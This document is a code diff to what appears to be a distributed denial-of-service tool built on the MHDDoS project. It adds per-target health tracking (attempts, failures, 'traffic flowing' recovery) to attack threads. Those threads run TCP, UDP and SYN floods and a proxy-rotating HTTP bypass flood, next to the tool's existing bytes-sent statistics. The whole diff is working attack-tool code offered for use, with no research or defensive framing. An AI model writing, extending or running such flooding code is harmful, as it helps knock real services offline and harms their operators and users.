@@ -1,15 +1,21 @@
 from __future__ import annotations
 
+import logging
 import threading
 from contextlib import suppress
 from random import choice as randchoice
-from typing import Any, Dict, Optional, Set
+from typing import Any, Dict, Optional, Set, TYPE_CHECKING
 
 from requests import Session
 
 from ..upstream.mhddos.start import HttpFlood, Layer4, Tools as UpstreamTools
 
+if TYPE_CHECKING:
+    from ..runner.health import TargetHealth
+
 L4_METHODS = frozenset({"TCP", "UDP", "SYN"})
+
+logger = logging.getLogger("BaseTool")
 
 
 class Capability:
@@ -52,12 +58,69 @@ def _record_stats(
         entry[1] += byte_count
 
 
+def _record_success(
+    target_health: Optional["TargetHealth"],
+    target_key: str,
+) -> None:
+    if target_health and target_health.record_success(target_key):
+        logger.info("target %s recovered: traffic flowing", target_key)
+
+
+def _install_health_hooks(
+    instance: threading.Thread,
+    *,
+    fn_name: str,
+    target_key: str,
+    target_health: Optional["TargetHealth"],
+) -> None:
+    if target_health is None:
+        return
+
+    if isinstance(instance, Layer4):
+
+        def _wrap_l4_method(orig_method):
+            def wrapper(*args, **kwargs):
+                target_health.record_attempt(target_key)
+                try:
+                    return orig_method(*args, **kwargs)
+                except Exception as exc:
+                    target_health.record_failure(target_key, exc)
+                    raise
+
+            return wrapper
+
+        for method_name in ("TCP", "UDP", "SYN"):
+            orig = getattr(instance, method_name)
+            wrapped = _wrap_l4_method(orig)
+            setattr(instance, method_name, wrapped)
+            if method_name in instance.methods:
+                instance.methods[method_name] = wrapped
+        return
+
+    if not isinstance(instance, HttpFlood):
+        return
+
+    cls = type(instance)
+    orig_open_connection = cls.open_connection
+
+    def hooked_open_connection(self, host=None):
+        target_health.record_attempt(target_key)
+        try:
+            return orig_open_connection(self, host)
+        except Exception as exc:
+            target_health.record_failure(target_key, exc)
+            raise
+
+    instance.open_connection = hooked_open_connection.__get__(instance, cls)
+
+
 def _install_stats_hooks(
     instance: threading.Thread,
     *,
     target_key: str,
     stats_dict: dict,
     stats_lock: threading.Lock,
+    target_health: Optional["TargetHealth"] = None,
 ) -> None:
     cls = type(instance)
     orig_send = cls._raw_send
@@ -67,12 +130,14 @@ def _install_stats_hooks(
         sent = orig_send(self, sock, payload)
         if sent:
             _record_stats(stats_dict, stats_lock, target_key, 1, _payload_len(payload))
+            _record_success(target_health, target_key)
         return sent
 
     def hooked_sendto(self, sock, payload, target):
         sent = orig_sendto(self, sock, payload, target)
         if sent:
             _record_stats(stats_dict, stats_lock, target_key, 1, _payload_len(payload))
+            _record_success(target_health, target_key)
         return sent
 
     instance._raw_send = hooked_send.__get__(instance, cls)
@@ -81,16 +146,29 @@ def _install_stats_hooks(
     if isinstance(instance, HttpFlood):
 
         def bypass_with_stats():
+            if target_health:
+                target_health.record_attempt(target_key)
             pro = None
             if instance._proxies:
                 pro = randchoice(instance._proxies)
-            with suppress(Exception), Session() as session:
-                for _ in range(instance._rpc):
-                    if pro:
-                        with session.get(
-                            instance._target.human_repr(),
-                            proxies=pro.asRequest(),
-                        ) as response:
+            try:
+                with suppress(Exception), Session() as session:
+                    for _ in range(instance._rpc):
+                        if pro:
+                            with session.get(
+                                instance._target.human_repr(),
+                                proxies=pro.asRequest(),
+                            ) as response:
+                                _record_stats(
+                                    stats_dict,
+                                    stats_lock,
+                                    target_key,
+                                    1,
+                                    UpstreamTools.sizeOfRequest(response),
+                                )
+                                _record_success(target_health, target_key)
+                                continue
+                        with session.get(instance._target.human_repr()) as response:
                             _record_stats(
                                 stats_dict,
                                 stats_lock,
@@ -98,15 +176,10 @@ def _install_stats_hooks(
                                 1,
                                 UpstreamTools.sizeOfRequest(response),
                             )
-                            continue
-                    with session.get(instance._target.human_repr()) as response:
-                        _record_stats(
-                            stats_dict,
-                            stats_lock,
-                            target_key,
-                            1,
-                            UpstreamTools.sizeOfRequest(response),
-                        )
+                            _record_success(target_health, target_key)
+            except Exception as exc:
+                if target_health:
+                    target_health.record_failure(target_key, exc)
 
         instance.BYPASS = bypass_with_stats
         if "BYPASS" in instance.methods:
@@ -120,6 +193,7 @@ def make_attack_thread(
     stats_dict: dict,
     stats_lock: threading.Lock,
     synevent: threading.Event,
+    target_health: Optional["TargetHealth"] = None,
     l4_target: Optional[tuple] = None,
     thread_id: Optional[int] = None,
     url=None,
@@ -153,10 +227,17 @@ def make_attack_thread(
             proxies=proxies,
         )
 
+    _install_health_hooks(
+        instance,
+        fn_name=fn_name,
+        target_key=target_key,
+        target_health=target_health,
+    )
     _install_stats_hooks(
         instance,
         target_key=target_key,
         stats_dict=stats_dict,
         stats_lock=stats_lock,
+        target_health=target_health,
     )
     return instance
